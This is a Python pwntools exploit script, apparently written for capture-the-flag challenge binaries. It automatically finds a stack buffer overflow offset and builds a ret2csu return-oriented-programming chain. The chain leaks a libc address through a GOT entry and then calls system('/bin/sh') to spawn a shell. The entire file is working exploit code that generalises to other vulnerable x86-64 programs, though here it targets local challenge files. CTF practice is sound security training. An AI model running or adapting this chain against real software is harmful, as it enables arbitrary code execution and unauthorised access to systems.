from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

file_name = './chals/chal2'
file_name = './chals/chal2a'
file_name = input('chal name: ').strip()

with open("datatransfer", 'w') as f:
    f.write(file_name)

p = process(['gdb',  '-ex', 'source gdbscript.py'])
time.sleep(2)

with open("datatransfer", 'rb') as f:
    offset = cyclic_find(f.read(), n=8)

if offset == -1:
    print("ERROR, couldn't find offset")
    print(offset)
    exit(-1)

p = process(file_name)
#gdb.attach(p, "b * main")

binary = ELF(file_name)
libc = ELF("/nix/store/7p1v1b6ys9fydg5kdqvr5mpr8svhwf4p-glibc-2.31/lib/libc.so.6")
rop = ROP(binary)

libcsuinit = binary.symbols['__libc_csu_init'] # TODO: Look up in case of different variables used in func call.
#libcsuinit_good_part = libcsuinit + (0x4011a3 - 0x401170)
#print(hex(libcsuinit_good_part))
libcsuinit_good_part = 0
while libcsuinit_good_part < libcsuinit:
    libcsuinit_good_part = next(binary.search(b'\x31\xdb\x0f\x1f')) # first xor ebx ebx after __libc_csu_init
print(hex(libcsuinit_good_part))

dis = disasm(binary.read(libcsuinit_good_part, 64))
#regs = {}
#regs[dis.split('rdx, ')[1].split()[0]] = 'rdx'
#regs[dis.split('rsi, ')[1].split()[0]] = 'rdi'
#regs[dis.split('edi, ')[1].split()[0]] = 'edi'
#regs[dis.split('QWORD PTR [')[1].split('+')[0]] = called_reg
#called_reg = [x for x in ['r12', 'r13', 'r14', 'r15'] if x not in regs][0]
#print(regs)

ret = rop.find_gadget(['ret']).address
fini = next(binary.search(p64(binary.symbols['_fini'])))
pop_rbp = rop.find_gadget(['pop rbp', 'ret']).address
pop_r12_r13_r14_r15 = rop.find_gadget(['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret']).address
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address

# set rbp to 1
# set r12 to an address that points to a ret instr (_fini is great)
# set r15 to desired rdx value
# set r14 to desired rsi value
# set r13 to desired rdi value
# call into 004011a3  xor     ebx, ebx  {0x0} line at __libc_csu_init
# set rbx-r15 if needed
# call target function

print_funcs = {
    "puts": ["buffer"],
    #"printf": ["buffer"],
    "printf": ["fmtstr", "buffer"],
    "write": ["fd", "buffer", "size"]
}
for func in print_funcs.keys():
    if func in binary.symbols:
        print_func = func
        break


print_func_got = "got." + print_func

def payload_for_call(func, arg1=0, arg2=0, arg3=0):
    regs = {}
    regs[dis.split('rdx, ')[1].split()[0]] = arg1
    regs[dis.split('rsi, ')[1].split()[0]] = arg2
    regs[dis.split('edi, ')[1].split()[0]] = arg3
    regs[dis.split('QWORD PTR [')[1].split('+')[0]] = fini
    print(regs)

    payload = b''
    payload += p64(pop_rbp)
    payload += p64(1)
    payload += p64(pop_r12_r13_r14_r15)
    payload += p64(regs.get('r12', regs.get('r12d'))) # r12
    payload += p64(regs.get('r13', regs.get('r13d'))) # r13
    payload += p64(regs['r14']) # r14
    payload += p64(regs['r15']) # r15
    payload += p64(libcsuinit_good_part)
    payload += p64(0x0) * 7
    payload += p64(pop_rdi)
    payload += p64(arg1)
    payload += p64(func)
    return payload

def gen_print_address_payload(address):
    # find print func to generate args
    # use payload_for_call
    args = []
    for arg in print_funcs[print_func]:
        if arg == "buffer":
            args.append(address)
        if arg == "fmtstr":
            args.append(next(binary.search(b"%s\x00")))  # TODO: Search for "%s" in memory
        if arg == "fd":
            args.append(1) # stdout
        if arg == "size":
            args.append(8) # writing 8 bytes is fine
    return payload_for_call(binary.plt[print_func], *args)
    #return payload_for_call(binary.symbols[print_func], *args)

print('offset', offset)
payload = b'A' * offset
payload += gen_print_address_payload(binary.symbols[print_func_got])
payload += p64(binary.symbols["main"])
p.recv()
p.sendline(payload)

if print_func != 'write':
    p.recvline()
    p.recvline()
    leak = p.recv()
else:
    p.recvline()
    p.recvline()
    leak = p.recv()

print(leak)
print(enhex(leak))
leak_start = leak.index(b'\x7f') + 1
leak = leak[:leak_start].ljust(8, b'\x00')
print(enhex(leak))
leak = u64(leak)

libc_base = leak - libc.symbols[print_func]

system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))

payload = b'A' * offset
print(hex(system))
payload += payload_for_call(system, binsh)
p.sendline(payload)

p.recv()
time.sleep(1)
p.sendline("echo flag{yeet}")
print(p.recv())
